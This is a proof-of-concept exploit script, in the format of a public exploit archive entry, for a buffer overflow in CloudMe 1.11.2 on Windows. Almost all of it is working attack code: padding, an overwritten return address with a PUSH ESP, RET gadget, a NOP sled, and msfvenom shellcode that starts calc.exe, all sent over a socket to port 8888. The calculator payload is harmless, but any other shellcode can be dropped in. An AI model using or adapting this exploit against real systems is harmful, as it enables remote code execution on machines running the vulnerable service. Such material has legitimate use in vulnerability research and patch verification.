# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
buf =  b""
buf += b"\xbb\xa5\xb0\xd2\x16\xdb\xd7\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x52\x31\x58\x12\x83\xc0\x04\x03\xfd\xbe\x30"
buf += b"\xe3\x01\x56\x36\x0c\xf9\xa7\x57\x84\x1c\x96\x57\xf2"
buf += b"\x55\x89\x67\x70\x3b\x26\x03\xd4\xaf\xbd\x61\xf1\xc0"
buf += b"\x76\xcf\x27\xef\x87\x7c\x1b\x6e\x04\x7f\x48\x50\x35"
buf += b"\xb0\x9d\x91\x72\xad\x6c\xc3\x2b\xb9\xc3\xf3\x58\xf7"
buf += b"\xdf\x78\x12\x19\x58\x9d\xe3\x18\x49\x30\x7f\x43\x49"
buf += b"\xb3\xac\xff\xc0\xab\xb1\x3a\x9a\x40\x01\xb0\x1d\x80"
buf += b"\x5b\x39\xb1\xed\x53\xc8\xcb\x2a\x53\x33\xbe\x42\xa7"
buf += b"\xce\xb9\x91\xd5\x14\x4f\x01\x7d\xde\xf7\xed\x7f\x33"
buf += b"\x61\x66\x73\xf8\xe5\x20\x90\xff\x2a\x5b\xac\x74\xcd"
buf += b"\x8b\x24\xce\xea\x0f\x6c\x94\x93\x16\xc8\x7b\xab\x48"
buf += b"\xb3\x24\x09\x03\x5e\x30\x20\x4e\x37\xf5\x09\x70\xc7"
buf += b"\x91\x1a\x03\xf5\x3e\xb1\x8b\xb5\xb7\x1f\x4c\xb9\xed"
buf += b"\xd8\xc2\x44\x0e\x19\xcb\x82\x5a\x49\x63\x22\xe3\x02"
buf += b"\x73\xcb\x36\x84\x23\x63\xe9\x65\x93\xc3\x59\x0e\xf9"
buf += b"\xcb\x86\x2e\x02\x06\xaf\xc5\xf9\xc1\xda\x13\x0f\x1d"
buf += b"\xb3\x21\x0f\x29\xed\xaf\xe9\x43\xe1\xf9\xa2\xfb\x98"
buf += b"\xa3\x38\x9d\x65\x7e\x45\x9d\xee\x8d\xba\x50\x07\xfb"
buf += b"\xa8\x05\xe7\xb6\x92\x80\xf8\x6c\xba\x4f\x6a\xeb\x3a"
buf += b"\x19\x97\xa4\x6d\x4e\x69\xbd\xfb\x62\xd0\x17\x19\x7f"
buf += b"\x84\x50\x99\xa4\x75\x5e\x20\x28\xc1\x44\x32\xf4\xca"
buf += b"\xc0\x66\xa8\x9c\x9e\xd0\x0e\x77\x51\x8a\xd8\x24\x3b"
buf += b"\x5a\x9c\x06\xfc\x1c\xa1\x42\x8a\xc0\x10\x3b\xcb\xff"
buf += b"\x9d\xab\xdb\x78\xc0\x4b\x23\x53\x40\x6b\xc6\x71\xbd"
buf += b"\x04\x5f\x10\x7c\x49\x60\xcf\x43\x74\xe3\xe5\x3b\x83"
buf += b"\xfb\x8c\x3e\xcf\xbb\x7d\x33\x40\x2e\x81\xe0\x61\x7b"

buff = padding1 + EIP + NOPS + buf 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buff)
except Exception as e:
	print(sys.exc_value)
